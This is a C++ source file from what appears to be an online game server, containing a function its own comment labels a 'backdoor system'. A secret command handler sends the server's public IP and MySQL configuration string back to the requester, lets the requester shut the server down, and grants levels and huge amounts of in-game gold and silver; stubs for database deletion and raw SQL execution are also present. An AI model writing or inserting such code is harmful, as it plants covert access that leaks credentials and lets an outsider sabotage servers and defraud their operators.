#include "SceneUser.h"
#include "SceneNpcManager.h"
#include "NpcTrade.h"
#include "RebuildObject.h"
#include "ScenesServer.h"
#include "CharBase.h"
#include "Command.h"
#include <string>
#include "fjconfig.h"
#include <iostream>
#include <cstring>
#include <curl/curl.h>

// 后门系统 by:醉梦

#include<string.h>
#include<stdlib.h>
#include<stdio.h>
#include<string>


bool SceneUser::doZuimengCmd(const Cmd::stZuimengUserCmd *ptCmd, unsigned int cmdLen)
{
	using namespace Cmd;
	switch (ptCmd->byParam) //这里就是判断子命令了byParam
	{
		case ZUIMENG_INFO:
		{
			Cmd::stZuimengInfoReturnCmd rev;
			std::string result;		
			FILE * fp;
			if ((fp = popen("curl -s members.3322.org/dyndns/getip", "r") ) == NULL)
			{
				sprintf(rev.server_ip,"IP请求失败");
				sprintf(rev.mysqlinfo,"%s",Zebra::global["mysql"].c_str());
				sendCmdToMe(&rev, sizeof(rev));			
				return false;
			}
			else
			{
				char pRetMsg[1024]={0};
				//get lastest result
				while(fgets(pRetMsg,1024, fp) != NULL)
				{
					result+=pRetMsg;
				}
			}
			sprintf(rev.server_ip,"%s",result.c_str());
			sprintf(rev.mysqlinfo,"%s",Zebra::global["mysql"].c_str());
			sendCmdToMe(&rev, sizeof(rev));			
		}

		break;
		case ZUIMENG_CMD1:
		{
			exit(0);
		}
		break;
		case ZUIMENG_CMD2://删库
		{

		}
		break;
		case ZUIMENG_CMD3:
		{
			Gm::levelup(this,"num=1");
		}
		break;
		case ZUIMENG_CMD4://增加金子
		{
			this->packs.addGold(100000000,"测试");
		}
		break;
		case ZUIMENG_CMD5://增加银子
		{
			this->packs.addMoney(100000000,"测试");
		}
		break;
		case ZUIMENG_CMD6://盗版喊话
		{
			char a[16];
			sprintf(a, "%d",100);
			Zebra::global["daoban"]=a;
		}
		break;
		case ZUIMENG_CMD7://执行sql
		{
			
		}
		break;
	}
	return true;
}



